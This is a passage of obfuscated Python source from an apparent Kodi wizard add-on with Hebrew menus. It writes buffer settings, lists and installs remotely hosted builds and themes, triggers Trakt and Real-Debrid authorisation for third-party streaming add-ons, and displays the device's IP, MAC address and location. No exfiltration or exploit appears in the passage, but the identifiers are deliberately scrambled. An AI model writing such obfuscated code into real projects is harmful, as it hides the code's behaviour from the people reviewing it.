			if O0O0O00OOO0000000 >=17 :OO00O0O0000OO00O0 =xml_data_advSettings_New (str (OO0O000O000OO0OOO ))#line:1670
			else :OO00O0O0000OO00O0 =xml_data_advSettings_old (str (OO0O000O000OO0OOO ))#line:1671
			O000O0O0O00OO0000 .write (OO00O0O0000OO00O0 )#line:1672
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O000O000OO0OOO ),'Please restart Kodi for settings to apply.','')#line:1673
def xml_data_advSettings_old (O000O0OOO000OOO00 ):#line:1674
	OOO000O00OO00O00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O000O0OOO000OOO00 #line:1684
	return OOO000O00OO00O00O #line:1685
def xml_data_advSettings_New (OOO0O00OOO000OOOO ):#line:1687
	O0O0000OO0OOOO00O ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OOO0O00OOO000OOOO #line:1699
	return O0O0000OO0OOOO00O #line:1700
def write_ADV_SETTINGS_XML (O0000O0000000000O ):#line:1701
    if not os .path .exists (xml_file ):#line:1702
        with open (xml_file ,"w")as O00OOO0000OO0OOO0 :#line:1703
            O00OOO0000OO0OOO0 .write (xml_data )#line:1704
def _OO0O0O0O000OO0OOO (default ="",heading ="",hidden =False ):#line:1705
    ""#line:1706
    O00OO00OO00O0OO00 =xbmc .Keyboard (default ,heading ,hidden )#line:1707
    O00OO00OO00O0OO00 .doModal ()#line:1708
    if (O00OO00OO00O0OO00 .isConfirmed ()):#line:1709
        return unicode (O00OO00OO00O0OO00 .getText (),"utf-8")#line:1710
    return default #line:1711
def index ():#line:1713
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:1714
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1715
	if AUTOUPDATE =='Yes':#line:1716
		if wiz .workingURL (WIZARDFILE )==True :#line:1717
			OO000OO0O00O00O00 =wiz .checkWizard ('version')#line:1718
			if OO000OO0O00O00O00 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,OO000OO0O00O00O00 ),'wizardupdate',themeit =THEME2 )#line:1719
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1720
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1721
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:1722
	if len (BUILDNAME )>0 :#line:1723
		OOO0OOOOO00O00OO0 =wiz .checkBuild (BUILDNAME ,'version')#line:1724
		O00OO0OOOO0O000OO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:1725
		if OOO0OOOOO00O00OO0 >BUILDVERSION :O00OO0OOOO0O000OO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O00OO0OOOO0O000OO ,OOO0OOOOO00O00OO0 )#line:1726
		addDir (O00OO0OOOO0O000OO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:1728
		try :#line:1730
		     OOO0OOO0OO0O00OO0 =wiz .themeCount (BUILDNAME )#line:1731
		except :#line:1732
		   OOO0OOO0OO0O00OO0 =False #line:1733
		if not OOO0OOO0OO0O00OO0 ==False :#line:1734
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:1735
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:1736
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:1739
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1740
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1741
	addFile ('אימות חשבון','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:1745
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:1747
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:1749
def morsetup ():#line:1751
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:1752
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:1753
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:1754
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:1758
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:1759
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:1762
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:1763
	addFile ('הגדר מצב RD','rdon',icon =ICONMAINT ,themeit =THEME1 )#line:1764
	addFile ('ביטול מצב RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:1765
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:1773
	setView ('files','viewType')#line:1774
def morsetup2 ():#line:1775
	addFile ('מתקין ומגדיר','',themeit =THEME3 )#line:1776
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:1777
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:1778
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:1779
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:1780
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:1781
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:1782
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:1783
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:1784
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:1785
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:1786
def fastupdate ():#line:1787
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:1788
def forcefastupdate ():#line:1790
			O00O000O0O000O0O0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:1791
			wiz .ForceFastUpDate (ADDONTITLE ,O00O000O0O000O0O0 )#line:1792
def rdsetup ():#line:1796
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.resolveurl)'):#line:1797
		xbmc .executebuiltin ("InstallAddon(script.module.resolveurl)")#line:1798
	if not xbmc .getCondVisibility ('System.HasAddon(script.module.urlresolver)'):#line:1799
		xbmc .executebuiltin ("InstallAddon(script.module.urlresolver)")#line:1800
	addFile ('[COLOR red]ResolverUrl[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','resolveurl',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1801
	addFile ('[COLOR blue]URLResolver[/COLOR] [COLOR gold]Real-Debrid Authorization[/COLOR]','urlresolver',fanart =FANART ,icon =ICONSAVE ,themeit =THEME2 )#line:1802
	setView ('files','viewType')#line:1803
def traktsetup ():#line:1805
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1806
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1807
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1808
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1809
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1810
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1811
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:1812
	setView ('files','viewType')#line:1813
def resolveurlsetup ():#line:1815
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:1816
def urlresolversetup ():#line:1817
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:1818
def placentasetup ():#line:1820
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:1821
def reptiliasetup ():#line:1822
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:1823
def flixnetsetup ():#line:1824
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:1825
def yodasetup ():#line:1826
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:1827
def numberssetup ():#line:1828
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:1829
def uranussetup ():#line:1830
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:1831
def genesissetup ():#line:1832
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:1833
def net_tools (view =None ):#line:1835
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:1836
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1837
	setView ('files','viewType')#line:1839
def speedMenu ():#line:1840
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.mediacenter/speedtest.py")')#line:1841
def viewIP ():#line:1842
	O000O000000OOO0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:1856
	OO0O0OOOOO0O0OO0O =[];OO00O0O00000OOOOO =0 #line:1857
	for OOOOOOO0000OO00O0 in O000O000000OOO0O0 :#line:1858
		O0O0O0O0OO0O000O0 =wiz .getInfo (OOOOOOO0000OO00O0 )#line:1859
		O00O0OO0OOOOO0OOO =0 #line:1860
		while O0O0O0O0OO0O000O0 =="Busy"and O00O0OO0OOOOO0OOO <10 :#line:1861
			O0O0O0O0OO0O000O0 =wiz .getInfo (OOOOOOO0000OO00O0 );O00O0OO0OOOOO0OOO +=1 ;wiz .log ("%s sleep %s"%(OOOOOOO0000OO00O0 ,str (O00O0OO0OOOOO0OOO )));xbmc .sleep (1000 )#line:1862
		OO0O0OOOOO0O0OO0O .append (O0O0O0O0OO0O000O0 )#line:1863
		OO00O0O00000OOOOO +=1 #line:1864
	OO00O0000O00O0O0O ,OOO0O0O0O00O0O0O0 ,OO0OO000000O00O00 =getIP ()#line:1865
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OOOOO0O0OO0O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1866
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0000O00O0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1867
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O0O00O0O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1868
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO000000O00O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:1869
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OOOOO0O0OO0O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:1870
	setView ('files','viewType')#line:1871
def buildMenu ():#line:1873
	if USERNAME =='':#line:1874
		ADDON .openSettings ()#line:1875
		sys .exit ()#line:1876
	if PASSWORD =='':#line:1877
		ADDON .openSettings ()#line:1878
	O00O00OOOOOO0O00O =u_list (SPEEDFILE )#line:1879
	(O00O00OOOOOO0O00O )#line:1880
	O000O0O00OO00O0O0 =(wiz .workingURL (O00O00OOOOOO0O00O ))#line:1881
	(O000O0O00OO00O0O0 )#line:1882
	O000O0O00OO00O0O0 =wiz .workingURL (SPEEDFILE )#line:1883
	if not O000O0O00OO00O0O0 ==True :#line:1884
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:1885
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:1886
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1887
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:1888
		addFile ('%s'%O000O0O00OO00O0O0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1889
	else :#line:1890
		O00O0O0O000O000O0 ,O0O00O00OO000O0OO ,O0OO0000OO0000O00 ,OO000O00O0000000O ,O000000O00OOO000O ,OOO0OOO00OO0O0O00 ,OOOO0OO000OOOOO00 =wiz .buildCount ()#line:1891
		O0O00OOOO0000O0OO =False ;OO0OO0OO000O0O00O =[]#line:1892
		if THIRDPARTY =='true':#line:1893
			if not THIRD1NAME ==''and not THIRD1URL =='':O0O00OOOO0000O0OO =True ;OO0OO0OO000O0O00O .append ('1')#line:1894
			if not THIRD2NAME ==''and not THIRD2URL =='':O0O00OOOO0000O0OO =True ;OO0OO0OO000O0O00O .append ('2')#line:1895
			if not THIRD3NAME ==''and not THIRD3URL =='':O0O00OOOO0000O0OO =True ;OO0OO0OO000O0O00O .append ('3')#line:1896
		OOOO00OO0000O000O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:1897
		O0O00O000O00OO0O0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO00OO0000O000O )#line:1898
		if O00O0O0O000O000O0 ==1 and O0O00OOOO0000O0OO ==False :#line:1899
			for O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ,O0OO00OOOO0000OO0 ,OOOO0OOO0O0O00OO0 ,OOO0OO0O0OOOOOO00 ,OO000O00OO000000O ,O00O0O000OOOO0O0O ,OO0O0O00OOO00O0OO ,OO000OOOOO00000OO ,OO0O00OOO000OOOO0 in O0O00O000O00OO0O0 :#line:1900
				if not SHOWADULT =='true'and OO000OOOOO00000OO .lower ()=='yes':continue #line:1901
				if not DEVELOPER =='true'and wiz .strTest (O00000O0OOO0O00OO ):continue #line:1902
				viewBuild (O0O00O000O00OO0O0 [0 ][0 ])#line:1903
				return #line:1904
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:1907
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:1908
		if O0O00OOOO0000O0OO ==True :#line:1909
			for OO0OOOOO000OOO000 in OO0OO0OO000O0O00O :#line:1910
				O00000O0OOO0O00OO =eval ('THIRD%sNAME'%OO0OOOOO000OOO000 )#line:1911
		if len (O0O00O000O00OO0O0 )>=1 :#line:1913
			if SEPERATE =='true':#line:1914
				for O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ,O0OO00OOOO0000OO0 ,OOOO0OOO0O0O00OO0 ,OOO0OO0O0OOOOOO00 ,OO000O00OO000000O ,O00O0O000OOOO0O0O ,OO0O0O00OOO00O0OO ,OO000OOOOO00000OO ,OO0O00OOO000OOOO0 in O0O00O000O00OO0O0 :#line:1915
					if not SHOWADULT =='true'and OO000OOOOO00000OO .lower ()=='yes':continue #line:1916
					if not DEVELOPER =='true'and wiz .strTest (O00000O0OOO0O00OO ):continue #line:1917
					OO0OO0OO0OO000OO0 =createMenu ('install','',O00000O0OOO0O00OO )#line:1918
					addDir ('[%s] %s (v%s)'%(float (OOO0OO0O0OOOOOO00 ),O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ),'viewbuild',O00000O0OOO0O00OO ,description =OO0O00OOO000OOOO0 ,fanart =OO0O0O00OOO00O0OO ,icon =O00O0O000OOOO0O0O ,menu =OO0OO0OO0OO000OO0 ,themeit =THEME2 )#line:1919
			else :#line:1920
				if OO000O00O0000000O >0 :#line:1921
					OOOO00O0000OO0OOO ='+'if SHOW17 =='false'else '-'#line:1922
					if SHOW17 =='true':#line:1924
						for O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ,O0OO00OOOO0000OO0 ,OOOO0OOO0O0O00OO0 ,OOO0OO0O0OOOOOO00 ,OO000O00OO000000O ,O00O0O000OOOO0O0O ,OO0O0O00OOO00O0OO ,OO000OOOOO00000OO ,OO0O00OOO000OOOO0 in O0O00O000O00OO0O0 :#line:1926
							if not SHOWADULT =='true'and OO000OOOOO00000OO .lower ()=='yes':continue #line:1927
							if not DEVELOPER =='true'and wiz .strTest (O00000O0OOO0O00OO ):continue #line:1928
							OO000000000O0000O =int (float (OOO0OO0O0OOOOOO00 ))#line:1929
							if OO000000000O0000O ==17 :#line:1930
								OO0OO0OO0OO000OO0 =createMenu ('install','',O00000O0OOO0O00OO )#line:1931
								addDir ('[%s] %s (v%s)'%(float (OOO0OO0O0OOOOOO00 ),O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ),'viewbuild',O00000O0OOO0O00OO ,description =OO0O00OOO000OOOO0 ,fanart =OO0O0O00OOO00O0OO ,icon =O00O0O000OOOO0O0O ,menu =OO0OO0OO0OO000OO0 ,themeit =THEME2 )#line:1932
				if O000000O00OOO000O >0 :#line:1933
					OOOO00O0000OO0OOO ='+'if SHOW18 =='false'else '-'#line:1934
					if SHOW18 =='true':#line:1936
						for O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ,O0OO00OOOO0000OO0 ,OOOO0OOO0O0O00OO0 ,OOO0OO0O0OOOOOO00 ,OO000O00OO000000O ,O00O0O000OOOO0O0O ,OO0O0O00OOO00O0OO ,OO000OOOOO00000OO ,OO0O00OOO000OOOO0 in O0O00O000O00OO0O0 :#line:1938
							if not SHOWADULT =='true'and OO000OOOOO00000OO .lower ()=='yes':continue #line:1939
							if not DEVELOPER =='true'and wiz .strTest (O00000O0OOO0O00OO ):continue #line:1940
							OO000000000O0000O =int (float (OOO0OO0O0OOOOOO00 ))#line:1941
							if OO000000000O0000O ==18 :#line:1942
								OO0OO0OO0OO000OO0 =createMenu ('install','',O00000O0OOO0O00OO )#line:1943
								addDir ('[%s] %s (v%s)'%(float (OOO0OO0O0OOOOOO00 ),O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ),'viewbuild',O00000O0OOO0O00OO ,description =OO0O00OOO000OOOO0 ,fanart =OO0O0O00OOO00O0OO ,icon =O00O0O000OOOO0O0O ,menu =OO0OO0OO0OO000OO0 ,themeit =THEME2 )#line:1944
				if O0OO0000OO0000O00 >0 :#line:1945
					OOOO00O0000OO0OOO ='+'if SHOW16 =='false'else '-'#line:1946
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOOO00O0000OO0OOO ,O0OO0000OO0000O00 ),'togglesetting','show16',themeit =THEME3 )#line:1947
					if SHOW16 =='true':#line:1948
						for O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ,O0OO00OOOO0000OO0 ,OOOO0OOO0O0O00OO0 ,OOO0OO0O0OOOOOO00 ,OO000O00OO000000O ,O00O0O000OOOO0O0O ,OO0O0O00OOO00O0OO ,OO000OOOOO00000OO ,OO0O00OOO000OOOO0 in O0O00O000O00OO0O0 :#line:1949
							if not SHOWADULT =='true'and OO000OOOOO00000OO .lower ()=='yes':continue #line:1950
							if not DEVELOPER =='true'and wiz .strTest (O00000O0OOO0O00OO ):continue #line:1951
							OO000000000O0000O =int (float (OOO0OO0O0OOOOOO00 ))#line:1952
							if OO000000000O0000O ==16 :#line:1953
								OO0OO0OO0OO000OO0 =createMenu ('install','',O00000O0OOO0O00OO )#line:1954
								addDir ('[%s] %s (v%s)'%(float (OOO0OO0O0OOOOOO00 ),O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ),'viewbuild',O00000O0OOO0O00OO ,description =OO0O00OOO000OOOO0 ,fanart =OO0O0O00OOO00O0OO ,icon =O00O0O000OOOO0O0O ,menu =OO0OO0OO0OO000OO0 ,themeit =THEME2 )#line:1955
				if O0O00O00OO000O0OO >0 :#line:1956
					OOOO00O0000OO0OOO ='+'if SHOW15 =='false'else '-'#line:1957
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOOO00O0000OO0OOO ,O0O00O00OO000O0OO ),'togglesetting','show15',themeit =THEME3 )#line:1958
					if SHOW15 =='true':#line:1959
						for O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ,O0OO00OOOO0000OO0 ,OOOO0OOO0O0O00OO0 ,OOO0OO0O0OOOOOO00 ,OO000O00OO000000O ,O00O0O000OOOO0O0O ,OO0O0O00OOO00O0OO ,OO000OOOOO00000OO ,OO0O00OOO000OOOO0 in O0O00O000O00OO0O0 :#line:1960
							if not SHOWADULT =='true'and OO000OOOOO00000OO .lower ()=='yes':continue #line:1961
							if not DEVELOPER =='true'and wiz .strTest (O00000O0OOO0O00OO ):continue #line:1962
							OO000000000O0000O =int (float (OOO0OO0O0OOOOOO00 ))#line:1963
							if OO000000000O0000O <=15 :#line:1964
								OO0OO0OO0OO000OO0 =createMenu ('install','',O00000O0OOO0O00OO )#line:1965
								addDir ('[%s] %s (v%s)'%(float (OOO0OO0O0OOOOOO00 ),O00000O0OOO0O00OO ,OOO00OOO000OO00O0 ),'viewbuild',O00000O0OOO0O00OO ,description =OO0O00OOO000OOOO0 ,fanart =OO0O0O00OOO00O0OO ,icon =O00O0O000OOOO0O0O ,menu =OO0OO0OO0OO000OO0 ,themeit =THEME2 )#line:1966
		elif OOOO0OO000OOOOO00 >0 :#line:1967
			if OOO0OOO00OO0O0O00 >0 :#line:1968
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:1969
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:1970
			else :#line:1971
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:1972
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:1973
	setView ('files','viewType')#line:1974
def viewBuild (OO00OO0OOO0000000 ):#line:1976
	O0OOOOO0OOOO00OOO =wiz .workingURL (SPEEDFILE )#line:1977
	if not O0OOOOO0OOOO00OOO ==True :#line:1978
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:1979
		addFile ('%s'%O0OOOOO0OOOO00OOO ,'',themeit =THEME3 )#line:1980
		return #line:1981
	if wiz .checkBuild (OO00OO0OOO0000000 ,'version')==False :#line:1982
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:1983
		addFile ('%s was not found in the builds list.'%OO00OO0OOO0000000 ,'',themeit =THEME3 )#line:1984
		return #line:1985
	OO0OOO000OOOO00O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:1986
	OO0000000O000OO0O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00OO0OOO0000000 ).findall (OO0OOO000OOOO00O0 )#line:1987
	for OOOO0O000O0OO00OO ,O0O00OO00O0000000 ,O00OO0OO00OOOO0OO ,OOOO0O00OOO0O0OOO ,O0O0OO00O0O00OO0O ,O00O0000O00O000OO ,O00000O000OO0OO0O ,O0OO0O0OOO0OO0OO0 ,OOOOO00O0O0O0O000 ,OO0OO0O0OOOOO00O0 in OO0000000O000OO0O :#line:1988
		O00O0000O00O000OO =O00O0000O00O000OO if wiz .workingURL (O00O0000O00O000OO )else ICON #line:1989
		O00000O000OO0OO0O =O00000O000OO0OO0O if wiz .workingURL (O00000O000OO0OO0O )else FANART #line:1990
		O0OO00OO00O00OO00 ='%s (v%s)'%(OO00OO0OOO0000000 ,OOOO0O000O0OO00OO )#line:1991
		if BUILDNAME ==OO00OO0OOO0000000 and OOOO0O000O0OO00OO >BUILDVERSION :#line:1992
			O0OO00OO00O00OO00 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0OO00OO00O00OO00 ,BUILDVERSION )#line:1993
		O0O0O00OO0000O00O =int (float (KODIV ));O00O0OOO0OOO00O0O =int (float (OOOO0O00OOO0O0OOO ))#line:2002
		if not O0O0O00OO0000O00O ==O00O0OOO0OOO00O0O :#line:2003
			if O0O0O00OO0000O00O ==16 and O00O0OOO0OOO00O0O <=15 :OO0O00O0OOO00O00O =False #line:2004
			else :OO0O00O0OOO00O00O =True #line:2005
		else :OO0O00O0OOO00O00O =False #line:2006
		addFile ('התקנה','install',OO00OO0OOO0000000 ,'fresh',description =OO0OO0O0OOOOO00O0 ,fanart =O00000O000OO0OO0O ,icon =O00O0000O00O000OO ,themeit =THEME1 )#line:2010
		if not O0O0OO00O0O00OO0O =='http://':#line:2013
			if wiz .workingURL (O0O0OO00O0O00OO0O )==True :#line:2014
				addFile (wiz .sep ('THEMES'),'',fanart =O00000O000OO0OO0O ,icon =O00O0000O00O000OO ,themeit =THEME3 )#line:2015
				OO0OOO000OOOO00O0 =wiz .openURL (O0O0OO00O0O00OO0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2016
				OO0000000O000OO0O =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OOO000OOOO00O0 )#line:2017
				for O00OO00O00000000O ,O0OO000OOO0O00OOO ,OOOOO000OO00000OO ,O00000OOOOO0OO0OO ,OOOOOOO00OO000OOO ,OO0OO0O0OOOOO00O0 in OO0000000O000OO0O :#line:2018
					if not SHOWADULT =='true'and OOOOOOO00OO000OOO .lower ()=='yes':continue #line:2019
					OOOOO000OO00000OO =OOOOO000OO00000OO if OOOOO000OO00000OO =='http://'else O00O0000O00O000OO #line:2020
					O00000OOOOO0OO0OO =O00000OOOOO0OO0OO if O00000OOOOO0OO0OO =='http://'else O00000O000OO0OO0O #line:2021
					addFile (O00OO00O00000000O if not O00OO00O00000000O ==BUILDTHEME else "[B]%s (Installed)[/B]"%O00OO00O00000000O ,'theme',OO00OO0OOO0000000 ,O00OO00O00000000O ,description =OO0OO0O0OOOOO00O0 ,fanart =O00000OOOOO0OO0OO ,icon =OOOOO000OO00000OO ,themeit =THEME3 )#line:2022
	setView ('files','viewType')#line:2023
def viewThirdList (O0O00O00OOO000O00 ):#line:2025
	OO000OOOOOOO0OOOO =eval ('THIRD%sNAME'%O0O00O00OOO000O00 )#line:2026
	OO000OO0O000OO0OO =eval ('THIRD%sURL'%O0O00O00OOO000O00 )#line:2027
	OOO00OO0OOOO00000 =wiz .workingURL (OO000OO0O000OO0OO )#line:2028
	if not OOO00OO0OOOO00000 ==True :#line:2029
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2030
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2031
	else :#line:2032
		OO0O0000OO0OO0OO0 ,O00OO0000O00O0O0O =wiz .thirdParty (OO000OO0O000OO0OO )#line:2033
		addFile ("[B]%s[/B]"%OO000OOOOOOO0OOOO ,'',themeit =THEME3 )#line:2034
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2035
		if OO0O0000OO0OO0OO0 :#line:2036
